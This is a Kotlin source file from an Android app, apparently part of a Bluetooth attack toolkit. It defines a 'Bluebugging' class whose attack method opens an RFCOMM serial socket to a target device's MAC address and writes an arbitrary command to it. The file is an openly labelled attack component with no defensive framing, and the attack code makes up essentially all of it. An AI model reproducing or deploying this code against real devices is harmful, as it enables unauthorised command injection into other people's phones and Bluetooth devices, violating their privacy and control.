package com.hereliesaz.blusnu.attack

import android.Manifest
import android.bluetooth.BluetoothAdapter
import android.bluetooth.BluetoothDevice
import android.content.Context
import android.content.pm.PackageManager
import androidx.core.app.ActivityCompat
import java.io.IOException
import java.util.*

import android.widget.Toast
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.withContext

class Bluebugging(
    private val context: Context,
    private val bluetoothAdapter: BluetoothAdapter?
) {
    suspend fun attack(macAddress: String, command: String) {
        if (bluetoothAdapter == null) {
            // TODO: Propagate error to UI: Bluetooth not supported
            return
        }

        val device: BluetoothDevice? = bluetoothAdapter.getRemoteDevice(macAddress)
        if (device == null) {
            // TODO: Propagate error to UI: Device not found
            return
        }

        if (ActivityCompat.checkSelfPermission(
                context,
                Manifest.permission.BLUETOOTH_CONNECT
            ) != PackageManager.PERMISSION_GRANTED
        ) {
            // TODO: Propagate error to UI: Missing permission
            return
        }

        withContext(Dispatchers.IO) {
            try {
                val uuid = UUID.fromString("00001101-0000-1000-8000-00805f9b34fb")
                device.createRfcommSocketToServiceRecord(uuid).use { socket ->
                    socket.connect()
                    val outputStream = socket.outputStream
                    outputStream.write(command.toByteArray())
                    withContext(Dispatchers.Main) {
                        Toast.makeText(context, "Command sent", Toast.LENGTH_SHORT).show()
                    }
                }
            } catch (e: IOException) {
                withContext(Dispatchers.Main) {
                    Toast.makeText(context, "Error: ${e.message}", Toast.LENGTH_LONG).show()
                }
                e.printStackTrace()
            }
        }
    }
}